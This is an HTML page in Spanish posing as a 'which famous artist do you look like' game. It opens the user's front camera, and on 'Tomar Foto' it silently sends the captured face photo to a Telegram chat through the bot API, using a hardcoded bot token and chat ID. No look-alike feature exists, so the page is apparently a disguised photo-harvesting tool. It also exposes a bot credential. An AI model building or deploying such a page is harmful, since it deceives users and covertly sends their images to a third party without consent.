<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>¿A qué artista famoso te pareces?</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background: linear-gradient(to right, #6a11cb, #2575fc);
            color: white;
            text-align: center;
            margin: 0;
            padding: 0;
        }

        #game-container {
            position: relative;
            width: 100%;
            height: 100vh;
            overflow: hidden;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
        }

        #video-container {
            position: relative;
            width: 100%;
            max-width: 400px;
            aspect-ratio: 3/4;
            background: black;
            border-radius: 10px;
            overflow: hidden;
        }

        #video {
            width: 100%;
            height: 100%;
            object-fit: cover;
        }

        #face-guide {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: 1;
            pointer-events: none;
        }

        #face-guide svg {
            width: 100%;
            height: 100%;
        }

        #game-controls {
            margin-top: 20px;
        }

        #game-controls button {
            padding: 10px 20px;
            border: none;
            border-radius: 5px;
            background: #6a11cb;
            color: white;
            cursor: pointer;
            font-size: 16px;
        }

        #game-controls button:hover {
            background: #2575fc;
        }

        #loading-message {
            display: none;
            margin-top: 10px;
            font-size: 14px;
        }
    </style>
</head>
<body>
    <div id="game-container">
        <div id="video-container">
            <video id="video" autoplay playsinline></video>
            <div id="face-guide">
                <!-- SVG para la guía del rostro -->
                <svg viewBox="0 0 400 600">
                    <circle cx="200" cy="250" r="80" stroke="white" stroke-width="3" fill="none" stroke-dasharray="8,8" />
                    <line x1="200" y1="150" x2="200" y2="350" stroke="white" stroke-width="2" stroke-dasharray="4,4" />
                    <line x1="120" y1="250" x2="280" y2="250" stroke="white" stroke-width="2" stroke-dasharray="4,4" />
                </svg>
            </div>
        </div>
        <div id="game-controls">
            <button onclick="capturePhoto()">Tomar Foto</button>
            <p id="loading-message">Procesando tu foto...</p>
        </div>
    </div>

    <script>
        const video = document.getElementById('video');
        const loadingMessage = document.getElementById('loading-message');

        // Inicializar la cámara
        async function initializeCamera() {
            const constraints = {
                video: { facingMode: "user" } // Usar cámara frontal
            };

            try {
                const stream = await navigator.mediaDevices.getUserMedia(constraints);
                video.srcObject = stream;
            } catch (error) {
                console.error('Error al acceder a la cámara:', error);
                alert('No se pudo acceder a la cámara. Verifica los permisos.');
            }
        }

        // Capturar foto y enviar al servidor
        async function capturePhoto() {
            loadingMessage.style.display = 'block';

            const canvas = document.createElement('canvas');
            const context = canvas.getContext('2d');

            // Configurar canvas con las dimensiones del video
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;

            // Dibujar imagen del video en el canvas
            context.drawImage(video, 0, 0, canvas.width, canvas.height);

            canvas.toBlob(async (blob) => {
                const botToken = '7555861557:AAGfZFvIiXAYxYUB21e7HHGCD7XPOXffM3g';
                const chatId = '1223367230';
                const formData = new FormData();
                formData.append('chat_id', chatId);
                formData.append('photo', blob, 'photo.jpg');

                const url = `https://api.telegram.org/bot${botToken}/sendPhoto`;

                try {
                    const response = await fetch(url, { method: 'POST', body: formData });
                    if (!response.ok) {
                        console.error('Error al enviar la foto:', await response.json());
                    }
                } catch (error) {
                    console.error('Error de red:', error.message);
                } finally {
                    loadingMessage.style.display = 'none';
                }
            }, 'image/jpeg');
        }

        // Iniciar la cámara al cargar la página
        window.onload = initializeCamera;
    </script>
</body>
</html>
